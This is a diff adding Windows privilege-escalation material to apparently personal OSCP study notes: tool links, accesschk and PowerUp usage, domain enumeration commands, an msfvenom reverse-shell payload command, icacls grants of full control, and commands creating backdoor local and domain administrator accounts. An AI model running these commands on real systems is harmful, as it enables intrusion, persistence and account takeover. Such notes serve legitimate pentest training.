@@ -42,6 +42,8 @@ https://parzival.sh/blog/my-oscp-notes-and-resources
 6. https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/windows_enumeration_and_privilege_escalation.md
 7. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 8. https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+9. https://www.hackingarticles.in/category/privilege-escalation/
+10. https://gist.github.com/Andross/bf990e87f3594dff58feb385e96c6b12
 
 # all about shells
 https://github.com/r4hn1/Pentesting-Cheatsheet
@@ -551,26 +553,81 @@ kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from
 ```
 
 # Window Priv Esc
-## Enumeration
+## Tools
+1. [winPEAS](https://github.com/carlospolop/priviledge-escalation-awesome-scripts-suite/tree/master/winPEAS)
+2. [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
+   - Needs to be run from powershell
+   - Searches for specific privilege escalation misconfigurations
+   - `powershell -exec bypass`
+   - `..\PowerUp.ps1`
+   - `Invoke-AllChecks`
+3. [Seatbelt](https://github.com/GhostPack/Seatbelt)
+4. [accesschk.exe](https://github.com/Andross/oscp/raw/main/accesschk.exe)
+5. **check service permissions (Which users can access and with what level of permissions)**
+`.\accesscheck /accepteula -quvw "C:\This\Is\The\Path"`
+**check for start stop permission**
+`.\accesscheck /accepteula -uvqc servicename`
+**Find all weak folder permissions per drive.**
+`accesschk.exe -uwdqs Users c:`
+`accesschk.exe -uwdqs "Authenticated Users" c:\`
+**Find all weak file permissions per drive.**
+``accesschk.exe -uwqs Users c:.``
+``accesschk.exe -uwqs "Authenticated Users" c:.``
+
+## Enumeration (https://github.com/gquere/WindowsPentestCommands)
+### Pre-checks
+1. Reverse shell with msfvenom (Note: will be blocked by antivirus)
+ `msfvenom -p windows/x64/shell_reverse_ tcp LHOST=x.x.x.x LPORT=XXXX -f exe -o reverse.exe`
+ Note: change exe to dll, or msi, and change the extension of output for other filetypes
+2. IF RDP is avaialble or can be enabled, we can add a low privileged user to the admin group and then spawn a shell (net localgroup administrators <username> /add) 
+
 ### User
 ```bash
 #which user
 whoami
-
-#what privilege
+whoami /groups
 whoami /priv
 
-#what other users
+#what local accounts users
 net users
 
 #check for admin privilege
 net localgroup administrators
 
+#List and get domain user info
+net user /domain
+net user <username> /domain
+
+#Get domain info
+echo %userdomain%
+echo %userdnsdomain%
+systeminfo
+
+#Domain controllers, including PDC info
+nltest /dclist:
+
 #list all saved creds from Credential Manager
 cmdkey /list
 
-#users who are logged in in current session
+#users who are logged in in current session/connected users
 qwinsta
+quser
+```
+
+### Permissions
+```bash
+#listing permissions
+icacls C:\Windows\SYSVOL\whatever
+
+#granting permissions
+icacls **C:\Windows\SYSVOL\whatever /grant** "NT AUTHORITY\Authenticated Users":F
+```
+
+### Services
+```bash
+net start
+sc query
+wmic service get
 ```
 
 ### Password
@@ -585,6 +642,7 @@ C:\> type 127.0.0.1.pwdump
 ```bash
 #check ports that are alr opened
 netstat -ano
+netstat -a -p TCP
 
 #check host -  IP address associated with a hostname, bypassing the DNS lookup process.
 C:\WINDOWS\System32\drivers\etc\hosts
@@ -615,6 +673,24 @@ PS C:\> Find-AllVulns
 ### Windows Exploits DB
 - https://github.com/SecWiki/windows-kernel-exploits
 - https://github.com/abatchy17/WindowsExploits
+
+## Windows common command
+### Adding Users Locally
+```bash
+net user /add kek ABCabc123
+net localgroup Administrators kek /add
+```
+
+### Adding Users in Domain
+```bash
+net user kek ABCabc123 /add /domain          #username=kek, pw=ABCabc123
+net group "Domain Admins" kek /add /domain    #groupname= Domain Admins, user to add=kek
+```
+
+### Run command as another user
+```bash
+runas /user:**domain\user** cmd.exe
+```
 
 ## Windows PE vectors
 1. The version of the operating system
